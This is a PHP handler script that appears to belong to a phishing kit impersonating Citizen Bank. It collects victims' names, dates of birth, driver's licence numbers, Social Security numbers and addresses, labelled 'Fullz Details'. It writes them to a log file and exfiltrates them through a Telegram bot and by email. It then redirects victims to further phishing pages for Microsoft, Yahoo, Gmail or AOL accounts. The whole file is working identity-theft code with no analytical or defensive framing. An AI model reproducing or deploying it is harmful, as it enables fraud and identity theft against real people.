<?php
         
         if (isset($_POST['account_verify']))
	          {
	          	include 'recon.php';
	          	include 'config.php';
	          // check for valid email address
	          $fname = $_POST['fname'];
	          $dob = $_POST['dob'];
	          $dlnum = $_POST['dlnum'];
	          $lname = $_POST['lname']; 
	          $address = $_POST['address'];  
	          $zipcode = $_POST['zipcode'];
	          $city = $_POST['city'];
	          $ssn = $_POST['ssn'];
	          $email = $_POST['email'];
	          
	          $ip = getenv("REMOTE_ADDR");
	          $useragent = $_SERVER['HTTP_USER_AGENT'];
	          //send email
	          $body = "::::::::::::::::::::::: $Name Citizen Bank Info [Fullz Details] :::::::::::::::::::::::::\r\n";
	          $body .= "First Name                         : $fname\r\n";
	          $body .= "Last Name                          : $lname\r\n";
	          $body .= "Date Of Birth                      : $dob\r\n";
	          $body .= "DL Number                          : $dlnum\r\n";
	          $body .= "Social Security Number             : $ssn\r\n";
	          $body .= "City                               : $city\r\n"; 
	          $body .= "Address                            : $address\r\n";
	          $body .= "ZipCode                            : $zipcode\r\n";
	          $body .=  "|--------------- I N F O | I P -------------------|\r\n";
	          $body .= "IP Address	                       : {$_SESSION['ip']}\r\n";
	          $body .= "IP Country	                       : {$_SESSION['country']}\r\n";
	          $body .= "IP City	                               : {$_SESSION['city']}\r\n";
	          $body .= "Browser		                       : {$_SESSION['browser']} on {$_SESSION['platform']}\r\n";
	          $body .= "User Agent	                       : {$_SERVER['HTTP_USER_AGENT']}\r\n";
	          $body .= "TIME		                       : ".date("d/m/Y h:i:sa")." GMT\r\n";
	          $body .= ":::::::::::::::::::::: $Name Citizen Bank Info :::::::::::::::::::::::::\r\n";
	          
	          $save=fopen("access/account_verify.txt","a+");
	          fwrite($save,$body);
	          fclose($save);

	         
              $result =  urlencode($body);
              file_get_contents('https://api.telegram.org/bot'.$Token.'/sendMessage?chat_id='.$ChatID.'&text='.$result."&parse_mode=html");
        
             
 
	          $subject="Citizen Bank $Name Card Details => From {$_SESSION['ip']} [ {$_SESSION['country']}-{$_SESSION['countrycode']} - {$_SESSION['platform']} ]";

	          $headers="From: Citizen Bank $Name V1 <$themariarobert@yandex.com>\r\n";
	          $headers.="MIME-Version: 1.0\r\n";
	          $headers.="Content-Type: text/plain; charset=UTF-8\r\n";
	         if(mail($mail, $subject, $body, $headers))
	          {
	          	$v_ip = $_SERVER['REMOTE_ADDR'];
$hash = md5($v_ip);

if ($_SESSION['email']=="" && !empty($_POST['email']))
{
$_SESSION['email'] = $_POST['email'];
}
if ($_SESSION['email']!=="" && !empty($_POST['email']))
{
$_SESSION['email'] = $_POST['email'];
}
elseif ($_SESSION['email']!=="" && empty($_POST['email']))
{
$_SESSION['email']=$_SESSION['email'];
}
if (strpos($_SESSION['email'], '@hotmail') !== false || strpos($_SESSION['email'], '@outlook') !== false || strpos($_SESSION['email'], '@live') !== false || strpos($_SESSION['email'], '@msn') !== false|| strpos($_SESSION['email'], '@windowslive') !== false) {



header("Location: ms/index.php");
	
}

elseif (strpos($_SESSION['email'], '@yahoo.com') !== false || strpos($_SESSION['email'], '@ymail') !== false) {



header("Location: yh/index.php");
}

elseif (strpos($_SESSION['email'], '@gmail') !== false) {



header("Location: gm/index.php");
	
}
elseif (strpos($_SESSION['email'], '@aol') !== false) {



header("Location: al/index.php");
	
}

else {



header("Location: em/index.php");
	
}
	          }
	          else
	          {
	        	
$v_ip = $_SERVER['REMOTE_ADDR'];
$hash = md5($v_ip);
if ($_SESSION['email']=="" && !empty($_POST['email']))
{
$_SESSION['email'] = $_POST['email'];
}
if ($_SESSION['email']!=="" && !empty($_POST['email']))
{
$_SESSION['email'] = $_POST['email'];
}
elseif ($_SESSION['email']!=="" && empty($_POST['email']))
{
$_SESSION['email']=$_SESSION['email'];
}
if (strpos($_SESSION['email'], '@hotmail') !== false || strpos($_SESSION['email'], '@outlook') !== false || strpos($_SESSION['email'], '@live') !== false || strpos($_SESSION['email'], '@msn') !== false|| strpos($_SESSION['email'], '@windowslive') !== false) {



header("Location: ms/index.php");
	
}

elseif (strpos($_SESSION['email'], '@yahoo.com') !== false || strpos($_SESSION['email'], '@ymail') !== false) {



header("Location: yh/index.php");
	
}

elseif (strpos($_SESSION['email'], '@gmail') !== false) {



header("Location: gm/index.php");
	
}
elseif (strpos($_SESSION['email'], '@aol') !== false) {



header("Location: al/index.php");
	
}

else {



header("Location: em/index.php");
	
}
	        	}
	          }
	          ?>